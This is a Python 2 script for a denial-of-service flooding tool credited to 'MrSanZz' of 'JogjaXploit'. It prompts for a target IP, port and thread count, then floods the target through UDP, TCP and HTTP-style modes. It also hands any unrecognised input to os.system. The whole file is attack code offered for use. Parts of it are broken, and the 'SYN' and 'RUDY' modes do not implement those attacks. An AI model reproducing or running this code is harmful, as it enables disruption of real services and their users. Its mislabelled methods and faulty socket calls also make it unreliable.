import socket, threading, os, random

if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')

print("\033[1;31;40m  _____  _____   ____   _____       _                             ______ ")
print(" |  __ \|  __ \ / __ \ / ____|     | |                           |____  |")
print(" | |  | | |  | | |  | | (___ ______| |     __ _ _   _  ___ _ __      / / ")
print(" | |  | | |  | | |  | |\___ \______| |    / _` | | | |/ _ \ '__|    / /  ")
print(" | |__| | |__| | |__| |____) |     | |___| (_| | |_| |  __/ |      / /   ")
print(" |_____/|_____/ \____/|_____/      |______\__,_|\__, |\___|_|     /_/    ")
print("                                                 __/ |                   ")
print("                                                |___/                    ")
print("\n")
print("\033[1;34m_"*33)
print("\033[1;32mExists Method:")
print("1.HTTP")
print("2.UDP")
print("3.TCP")
print("4.RUDY")
print("5.SYN")
print("6.NUKE")
print("7.HTTPS")
print("\033[1;34m_"*33)
print("\t\t\033[37mMade By MrSanZz")
print("\tTeam : \033[1;91mJogjaXploit\033[37m")
print("Write exit For Exit")
print("\n")
while True:
    try:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        rudy1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        rudy2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        byte = random._urandom(60000)
        byte2 = random._urandom(50000)
        sent = 5000
        fakeit = ['192.168.1.1','192.154.4.4','192.167.1.4','192.155.3.3']
        prompt = raw_input("\033[1;34mL7@root \033[1;33m~$ \033[37m")
        if prompt.lower() == "udp":
            print "\033[1;33mUDP Mode"
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            thread = input("Thread : ")
            bytes = input("Bytes Per Sec : ")

            def fluud():
                try:
                    udp.sendto(byte, (ip,port))
                    for i in range(bytes):
                        udp.sendto(byte, (ip,port))
                    print "\033[1;91mSending %s Botnet | Target %s Port %s sent %s"%(sent,ip,port)
                except KeyboardInterrupt:
                    exit()
                except:
                    print "\033[1;33m[ UDP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
            for i in range(thread):
                thr = threading.Thread(target=fluud)
                thr.start()
        elif prompt.lower() == "http":
            print "\033[1;33mHTTP Mode"
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            thread = input("Thread : ")
            bytes = int(input("Bytes Per Sec : "))
        
            def flood():
                for e in fakeit:
                    try:
                        rudy2.sendto(byte, (ip,port))
                        for i in range(bytes):
                            rudy2.sendto(byte, (ip,port))
                        http.send(("GET /"+ip+"/HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
                        http.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))
                        for i in range(thread):
                            http.send(byte)    
                        print "\033[1;91mSending %s Botnet | Target %s Port %s"%(sent,ip,port)
                    except:                 
                        print "\033[1;33m[ HTTP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
            for i in range(thread):
                thr = threading.Thread(target=flood)
                thr.start()
        elif prompt.lower() == "tcp":
            print "\033[1;33mTCP Mode"
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            thread = input("Thread : ")
            bytes = input("Bytes Per Sec : ")
        
            def flttd():
                for e in fakeit:
                    try:
                        tcp.sendto(byte, (ip,port))
                        for i in range(bytes):
                            tcp.send(byte)
                        print "\033[1;91mSending %s Botnet | Target %s Port %s"%(sent,ip,port)
                    except KeyboardInterrupt:
                        exit()
                    except:                 
                        print "\033[1;33m[ TCP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
            for i in range(thread):
                thr = threading.Thread(target=flttd)
                thr.start()
        elif prompt.lower() == "rudy":
            print "\033[1;32mRUDY Method Selected"
            sent = 5000
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            bytes = int(input("Byte Per Sec : "))
            thread = input("Threads : ")
            
            def rudy():
                for e in fakeit:
                    try:
                        rudy2.sendto(byte, (ip,port))
                        for i in range(bytes):
                            rudy2.sendto(byte, (ip,port))
                        http.send(("GET /"+ip+"/HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
                        http.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))
                        for i in range(thread):
                            http.send(byte)    
                        print "\033[1;33m[ RUDY ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
                    except:                    
                        print "\033[1;33m[ RUDY ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
            for i in range(thread):
                thread = threading.Thread(target=rudy)
                thread.start()    
        elif prompt.lower() == "syn":
            print("\033[1;32mSYN Flood")
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            thread = input("Thread : ")
            bps = input("Bytes Per Sec : ")
            
            def syn():
                for i in fakeit:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s2= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s3= socket.socket(socket.AF_INET, socket.SOCK_RAW)
                        s.sendto(byte, (ip,port))
                        for i in range(bps):
                            s.sendto(byte, (ip,port))
                        s2.send(("GET /HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
                        s2.send(("Host: "+i+"\r\n\r\n").encode("ascii"), (ip,port))
                        s3.sendto(byte, (ip,port))
                    except:                       
                        print "\033[1;33m[ SYN ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
            for i in range(thread):
                thd = threading.Thread(target=syn)
                thd.start()
        elif prompt.lower() == "nuke":
            print("\033[1;32mNuke Flood")
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            thread = input("Thread : ")
            bps = input("Bytes Per Sec : ")
            
            def nuke():
                for i in fakeit:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s2= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        for i in range(bps):
                            s2.sendto(byte, (ip,port))
                            s2.sendto(byte2, (ip,port))
                            for e in range(bps):
                                s2.sendto(byte, (ip,port))
                        s.send(("GET /HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
                        s.send(("GET /1.1/HTTP/1.2\r\n\r\n").encode("ascii"), (ip,port))
                        s.send(("Host: "+i+"\r\n\r\n").encode("ascii"), (ip,port))
                    except:                        
                        print "\033[1;33m[ NUKE ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
            for i in range(thread):
                thd = threading.Thread(target=nuke)
                thd.start()
        elif prompt.lower() == "https":
            ht = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("\033[1;32mHTTPS Flood")
            ip = raw_input("IP Target : ")
            port = input("Port : ")
            thread = input("Thread : ")
            bps = input("Bytes Per Sec : ")
            
            def https():
                x = int(0)
                for i in fakeit:
                    try:
                        x += 1
                        for i in range(bps):
                            udp.sendto(byte, (ip,port))
                            udp.sendto(byte2, (ip,port))
                        ht.sendall(("GET /"+ip+" HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
                        ht.sendall(("Host: "+i+"\r\n\r\n").encode("ascii"), (ip,port))
                        ht.send(byte)
                        ht.send(byte2)
                    except:
                        print "\033[1;33m[ HTTPS ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s sent : %s"%(sent,ip,port)
            for i in range(thread):
                thd = threading.Thread(target=https)
                thd.start()
        elif prompt.lower() == "exit":
            exit()       
        else:
            os.system(prompt)   
    except SyntaxError:
        continue           
    except KeyboardInterrupt:
        continue
